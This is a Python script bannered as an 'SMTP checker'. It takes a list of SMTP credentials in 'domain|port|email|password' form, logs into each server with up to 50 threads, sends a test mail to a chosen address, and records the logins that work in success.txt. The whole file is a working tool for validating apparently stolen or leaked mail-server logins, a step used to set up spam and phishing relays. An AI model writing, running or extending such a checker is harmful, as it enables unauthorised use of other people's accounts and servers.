# -*- coding: utf-8 -*-
import sys
if sys.version_info.major < 3:
    print("Please use Python 3 to run this script.")
    sys.exit(1)
import concurrent.futures
import smtplib
from colorama import init, Fore
init(autoreset=True)
logo = """
╔═╗╔╦╗╔╦╗╔═╗╔═╗╦ ╦╔═╗╔═╗╦╔═╔═╗╦═╗
╚═╗║║║ ║ ╠═╝║  ╠═╣║╣ ║  ╠╩╗║╣ ╠╦╝
╚═╝╩ ╩ ╩ ╩  ╚═╝╩ ╩╚═╝╚═╝╩ ╩╚═╝╩╚═
            fast checker                                                                                  
the format should be like this 'domain|port|email|password'
"""

print(Fore.YELLOW + logo)

smtps_file_path = input("enter the smtp list : ")
with open(smtps_file_path, 'r') as f:
    smtps = [line.strip() for line in f.readlines()]

email_to_check = input(" enter the email address to check: ")

def check_smtp(smtp):
    global email_to_check
    domain, port, username, password = smtp.split('|')
    print(f"\nTrying {domain}...")
    try:
        with smtplib.SMTP(domain, port, timeout=10) as smtp_server:
            smtp_server.starttls()
            smtp_server.login(username, password)

            message = f"SMTP used: {smtp}\n"

            smtp_server.sendmail(username, email_to_check, message)

            success_msg = f"Message sent successfully using {smtp}"
            print(Fore.GREEN + success_msg)
            with open('success.txt', 'a') as f:
                f.write(smtp + '\n')
    except Exception as e:
        print(Fore.RED + f"Error sending message using {domain}: {str(e)}")

with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
    executor.map(check_smtp, smtps)
